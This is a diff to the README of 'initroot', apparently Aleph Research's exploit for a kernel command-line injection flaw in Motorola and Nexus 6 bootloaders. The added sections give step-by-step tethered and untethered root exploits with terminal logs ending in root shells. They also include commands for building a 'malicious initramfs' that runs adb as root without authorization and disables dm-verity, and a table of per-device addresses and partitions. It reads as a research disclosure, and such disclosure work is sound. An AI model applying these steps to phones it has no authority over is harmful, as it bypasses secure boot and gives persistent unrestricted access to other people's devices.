@@ -2,19 +2,120 @@
 
 By Roee Hay / Aleph Research, HCL Technologies
 
-## Instructions ##
+## First stage exploit: Thethered jailbreak ##
+
+This exploit gains an ephemeral unrestricted root access on the device.
+For example, on `cedric` (some messages were removed for readability):
+
+```terminal
+$ cd ./tethered/cedric
+$ ./initroot-tethered.sh
+Welcome to initroot-cedric-tethered
+...
+(bootloader) <UTAG name="fsg-id" type="str" protected="false">
+(bootloader)   <value>
+(bootloader)     a initrd=0xA2100000,1588596
+(bootloader)   </value>
+(bootloader)   <description>
+(bootloader)     FSG IDs, see http://goo.gl/gPmhU
+(bootloader)   </description>
+(bootloader) </UTAG>
+OKAY [  0.015s]
+finished. total time: 0.015s
+target reported max download size of 536870912 bytes
+sending 'aleph' (34319 KB)...
+OKAY [  1.098s]
+writing 'aleph'...
+(bootloader) Invalid partition name aleph
+FAILED (remote failure)
+finished. total time: 1.101s
+(bootloader) slot-count: not found
+(bootloader) slot-suffixes: not found
+(bootloader) slot-suffixes: not found
+resuming boot...
+OKAY [  0.006s]
+finished. total time: 0.006s
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3014(readproc) context=u:r:shell:s0
+$ adb shell
+cedric:/ # 
+
+```
+
+## Second stage exploit: Untethered jailbreak ##
+
+This exploit gains a persistent root access on the device.
+For example, on `athene` (some messages were removed for readabilitiy):
+
+```terminal
+$ cd ./untethered/athene
+
+./initroot-untethered.sh 
+Welcome to initroot-athene-untethered
+Welcome to initroot-athene-tethered
+...
+(bootloader) <UTAG name="fsg-id" type="str" protected="false">
+(bootloader)   <value>
+(bootloader)     a initrd=0x92000000,2505052
+(bootloader)   </value>
+(bootloader)   <description>
+(bootloader)     FSG IDs, see http://goo.gl/gPmhU
+(bootloader)   </description>
+(bootloader) </UTAG>
+
+OKAY [  0.015s]
+finished. total time: 0.015s
+target reported max download size of 536870912 bytes
+sending 'aleph' (35214 KB)...
+OKAY [  1.131s]
+writing 'aleph'...
+(bootloader) Invalid partition name aleph
+FAILED (remote failure)
+finished. total time: 1.138s
+(bootloader) slot-count: not found
+(bootloader) slot-suffixes: not found
+(bootloader) slot-suffixes: not found
+resuming boot...
+OKAY [  0.006s]
+finished. total time: 0.006s
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3014(readproc) context=u:r:kernel:s0
+padC-initroot: 1 file pushed. 11.1 MB/s (22937600 bytes in 1.963s)
+44800+0 records in
+44800+0 records out
+22937600 bytes transferred in 3.017 secs (7602784 bytes/sec)
+...
+(bootloader) <UTAG name="fsg-id" type="str" protected="false">
+(bootloader)   <value>
+(bootloader)     a rdinit= root=/dev/mmcblk0p41
+(bootloader)   </value>
+(bootloader)   <description>
+(bootloader)     FSG IDs, see http://goo.gl/gPmhU
+(bootloader)   </description>
+(bootloader) </UTAG>
+
+OKAY [  0.015s]
+finished. total time: 0.015s
+rebooting...
+
+finished. total time: 0.815s
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3014(readproc) context=u:r:kernel:s0
+athene:/ # 
+
+```
+
+## Producing your own malicious initramfs archive ##
 
 1. Use the commited `initroot-<device>.cpio.gz`, or produce your own:
 ```
 $ cd <initramfs folder>
 $ find . | grep -v [.]$ | cpio -R root:root -o -H newc | gzip > ../initroot-<device>.cpio.gz
 OR if padding is needed:
+$ dd if=/dev/zero of=../pad ibs=1 count=<PAD_SIZE>
 $ cp ../pad ../initroot-<device>.cpio.gz && find . | grep -v [.]$ | cpio -R root:root -o -H newc | gzip > ../tmp && ls -la ../tmp && cat ../tmp >> ../initroot-<device>.cpio.gz  && rm -fr ../tmp
 $ cd ..
 ```
 2. Our commited initramfs images have adb running as root by default. It will not ask for authorization. In addition, dm-verity is disabled on the relevant partitions
 ```terminal
-fastboot oem config fsg-id "a initrd=<SCRATCH_ADDR+PADDING>,<initroot.cpio.gz size-PADDING>"`
+fastboot oem config fsg-id "a initrd=<SCRATCH_ADDR+PAD_SIZE>,<initroot.cpio.gz size-PAD_SIZE>"`
 fastboot flash foo initroot-<device>.cpio.gz`
 fastboot continue
 ```
@@ -25,12 +126,17 @@ shamu:/ # id
 uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
 ```
 
+## Creating an Untethered exploit for other Moto devices ##
+
+Read our [blog post](https://alephsecurity.com/2017/08/30/untethered-initroot/#persisting-the-payload)
+
+
 ## Verified Devices ##
-| Device           | Codename | `SCRATCH_ADDR` | `PADDING`   | committed `initrams`
+| Device           | Codename | `SCRATCH_ADDR` | `PADDING`   | committed `initrams` | Unused Partition
 |------------------|--------------|--------------|-----------|---------
-| Nexus 6  | `shamu` | `0x11000000`   | `0x0`         | AOSP `userdebug`
-| Moto G5 (XT1676) | `cedric` | `0xA0100000`   | `0x2000000` | Release, patched `init` and `adbd` to disable SELinux, `set{u,g}id` to shell, capabilities drop and adb auth, etc
-| Moto G4 (XT1622) | `athene` | `0x90000000`   | `0x2000000` | ""
+| Nexus 6  | `shamu` | `0x11000000`   | `0x0`         | AOSP `userdebug` | `mmcblk0p11`
+| Moto G5 (XT1676) | `cedric` | `0xA0100000`   | `0x2000000` | Release, patched `init` and `adbd` to disable SELinux, `set{u,g}id` to shell, capabilities drop and adb auth, etc | `mmcblk0p41`
+| Moto G4 (XT1622) | `athene` | `0x90000000`   | `0x2000000` | "" | `mmcblk0p48`
 
 
 ## Community Reported ##
@@ -56,6 +162,7 @@ This vulnerability may affect other Motorola devices too: a different initramfs 
 1. [initroot: Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection](https://alephsecurity.com/2017/05/23/nexus6-initroot/)
 2. [initroot: Hello Moto](https://alephsecurity.com/2017/06/07/initroot-moto/)
 3. [Motorola Android Bootloader Kernel Cmdline Injection Secure Boot Bypass](https://alephsecurity.com/vulns/aleph-2017011)
-
+4. [Untethered initroot (USENIX WOOT '17)](https://alephsecurity.com/2017/08/30/untethered-initroot)
+5. [USENIX WOOT '17 paper](https://www.usenix.org/conference/woot17/workshop-program/presentation/hay)
 
 
